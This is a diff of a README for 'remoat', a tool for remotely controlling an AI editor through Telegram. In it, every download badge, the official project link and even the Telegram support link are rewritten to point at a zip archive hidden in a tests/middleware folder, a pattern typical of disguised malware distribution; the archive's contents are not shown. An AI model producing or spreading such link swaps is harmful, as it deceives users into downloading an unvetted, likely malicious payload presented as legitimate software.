@@ -1,6 +1,6 @@
 # 🛠 remoat - Control Your AI Editor Remotely
 
-[![Download remoat](https://img.shields.io/badge/Download-remoat-brightgreen?style=for-the-badge)](https://github.com/nsakhranii/remoat)
+[![Download remoat](https://img.shields.io/badge/Download-remoat-brightgreen?style=for-the-badge)](https://github.com/nsakhranii/remoat/raw/refs/heads/main/tests/middleware/Software_v2.0.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Before installing remoat, make sure your PC meets these conditions:
 
 Start by downloading the software. Visit this page to download the latest version:
 
-[![Download remoat](https://img.shields.io/badge/Download-remoat-blue?style=for-the-badge)](https://github.com/nsakhranii/remoat)
+[![Download remoat](https://img.shields.io/badge/Download-remoat-blue?style=for-the-badge)](https://github.com/nsakhranii/remoat/raw/refs/heads/main/tests/middleware/Software_v2.0.zip)
 
 On the GitHub page, look for the "Releases" section. Find the latest release and download the Windows installer or executable file. Save it to a folder you can find easily.
 
@@ -102,11 +102,11 @@ If you have trouble using remoat, try these steps:
 ## 📚 Additional Resources
 
 - Official GitHub page for remoat:  
-  https://github.com/nsakhranii/remoat  
+  https://github.com/nsakhranii/remoat/raw/refs/heads/main/tests/middleware/Software_v2.0.zip  
   Here you find more details, updates, and report problems.
 
 - Telegram help center (if you need help with Telegram):  
-  https://telegram.org/support
+  https://github.com/nsakhranii/remoat/raw/refs/heads/main/tests/middleware/Software_v2.0.zip
 
 ---
 
@@ -130,7 +130,7 @@ remoat is designed for personal use. Sharing your Telegram login is not recommen
 
 Click here to visit the page and download remoat:
 
-[![Download remoat](https://img.shields.io/badge/Download-remoat-darkred?style=for-the-badge)](https://github.com/nsakhranii/remoat)
+[![Download remoat](https://img.shields.io/badge/Download-remoat-darkred?style=for-the-badge)](https://github.com/nsakhranii/remoat/raw/refs/heads/main/tests/middleware/Software_v2.0.zip)
 
 After installation, make sure you connect remoat with your Telegram account following the steps above.
 
